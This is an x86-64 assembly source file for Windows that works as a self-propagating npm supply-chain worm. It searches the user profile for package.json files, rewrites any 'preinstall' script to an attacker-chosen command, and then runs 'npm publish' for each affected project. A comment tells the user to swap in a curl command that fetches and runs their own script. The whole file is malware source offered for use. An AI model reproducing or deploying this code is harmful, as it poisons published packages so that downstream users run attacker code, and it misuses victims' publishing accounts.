bits 64

default rel

section .data
	folderName   db "USERPROFILE", 0
	bufferSize   dd 256
	starDotStar  db "\*", 0
	dotDir db ".", 0
	dotDotDir db "..", 0
	formatStr db "%s", 10, 0
	backslash db "\\", 0
	npmEntry db "package.json", 0
	searchStr db '"preinstall":', 0
	; REPLACE THIS WITH A CURL COMMAND POINTIN TO YOUR SCRIPT
	; AND THEN RUN THAT SCRIPT 
	newValue db 'start xyz.png', 0
	successMsg db "File updated successfully!", 10, 0
	failMsg db "Failed to open file for writing", 10, 0
	cd db "cd ", 0
	andC db " && ", 0
	command db "npm publish", 0

section .bss
	initialBuffer resb 512
	fileBuffer resb 65536
	outputBuffer resb 65536

section .text
	extern GetEnvironmentVariableA
	extern ExitProcess
	extern printf
	extern lstrcpyA
	extern lstrcatA
	extern lstrcmpA
	extern FindFirstFileA
	extern FindNextFileA
	extern FindClose
	extern CreateFileA
	extern ReadFile
	extern WriteFile
	extern CloseHandle
	extern strstr
	extern strlen
	extern system

global main

main:
	push rbp
	mov rbp, rsp
	sub rsp, 32
	call GetEnvironmentVariableA(folderName, initialBuffer, [bufferSize])
	call processDir(initialBuffer)
.end:
	call ExitProcess(0)
	add rsp, 32
	pop rbp
	ret

processDir:
	push rbp
	mov rbp, rsp
	sub rsp, 1664
	push r14
	push r15

	mov r14, rcx

	call lstrcpyA(*[rbp-1024], r14)
	call lstrcpyA(*[rbp-512], *[rbp-1024])
	call lstrcatA(*[rbp-512], *[starDotStar])
	call FindFirstFileA(*[rbp-512], *[rbp-1616])

	mov [rbp-1624], rax

	if rax == -1
		jmp .done
	endif

	jmp .processEntry

.loop:
	call FindNextFileA([rbp-1624], *[rbp-1616])

	if rax == 0
		call FindClose([rbp-1624])
		jmp .done
	endif

.processEntry:
	lea r15, [rbp-1616]
	add r15, 44

	call lstrcmpA(r15, *[dotDir])

	if rax == 0
		jmp .loop
	endif

	call lstrcmpA(r15, *[dotDotDir])

	if rax == 0
		jmp .loop
	endif

	call lstrcmpA(r15, npmEntry)

	if rax  == 0
		call printf(*[formatStr], "FOUND IT:")
		jmp .checkPKG
	endif

	lea rax, [rbp-1616]
	mov eax, dword [rax]
	and eax, 0x10

	if rax != 0
		call printf(*[formatStr], *[rbp-1024])

		sub rsp, 544
		mov rcx, rsp
		add rcx, 32
		call lstrcpyA(rcx, *[rbp-1024])

		mov rcx, rsp
		add rcx, 32
		call lstrcatA(rcx, *[backslash])

		mov rcx, rsp
		add rcx, 32
		call lstrcatA(rcx, r15)

		mov rcx, rsp
		add rcx, 32
		call processDir

		add rsp, 544
	else
		call printf(*[formatStr], r15)
	endif
	jmp .loop

.checkPKG:
	lea r15, [rbp-1616]
	add r15, 44

	call lstrcpyA(*[rbp-512], *[rbp-1024])
	call lstrcatA(*[rbp-512], *[backslash])
	call lstrcatA(*[rbp-512], r15)

	sub rsp, 80
	call CreateFileA(*[rbp-512], 0x80000000, 1, 0, 3, 0x80, 0)

	if rax == -1
		add rsp, 80
		jmp .done
	endif

	mov r14, rax

	call ReadFile(r14, *[fileBuffer], 65535, *[rbp-1600], 0)

	mov eax, dword [rbp-1600]
	lea rcx, [fileBuffer]
	add rcx, rax
	mov byte [rcx], 0
	call strstr(*[fileBuffer], *[searchStr])

	if rax != 0
		mov r12, rax
		call printf(*[formatStr], "Found preinstall, replacing...")
		mov rax, r12
		add rax, 14
		mov rbx, rax
		.findOpenQuote:
			mov cl, byte [rbx]
			if cl == '"'
				inc rbx
				mov r12, rbx
				jmp .findCloseQuote
			endif
			inc rbx
			jmp .findOpenQuote
		.findCloseQuote:
			mov cl, byte [rbx]
			if cl == '"'
				mov r13, rbx
				jmp .replacestring
			endif
			inc rbx
			jmp .findCloseQuote
		.replacestring:
			push rdi
			push rsi

			lea rdi, [outputBuffer]
			mov [rbp-1632], rdi
			lea rsi, [fileBuffer]
			mov rcx, r12
			sub rcx, rsi
			rep movsb

			lea rsi, [newValue]
			mov rcx, 13
			rep movsb

			mov rsi, r13
			lea rcx, [fileBuffer]
			mov eax, dword [rbp-1600]
			add rcx, rax
			sub rcx, rsi
			rep movsb

			mov rax, [rbp-1632]
			sub rdi, rax
			mov [rbp-1608], rdi

			pop rsi
			pop rdi

			call CloseHandle(r14)
			call CreateFileA(*[rbp-512], 0x40000000, 0, 0, 2, 0x80, 0)
			
			if rax == -1
				call printf(*[formatStr], failMsg)
				add rsp, 80
				jmp .done
			endif

			mov r14, rax
			mov r8, [rbp-1608]

			call WriteFile(r14, *[outputBuffer], r8, *[rbp-1600], 0)
			call printf(*[formatStr], successMsg)
			call CloseHandle(r14)

			call lstrcpyA(*[rbp-524], *[cd])
			call lstrcatA(*[rbp-524], *[rbp-1024])
			call lstrcatA(*[rbp-524], *[andC])
			call lstrcatA(*[rbp-524], *[command])

			call printf(*[formatStr], *[rbp-524])
			call system(*[rbp-524])

			add rsp, 80
			jmp .done

	else
		call printf(*[formatStr], "preinstall not found.")
		call CloseHandle(r14)
		add rsp, 80
	endif
	jmp .loop

.done:
	pop r15
	pop r14
	add rsp, 1664
	pop rbp
	ret
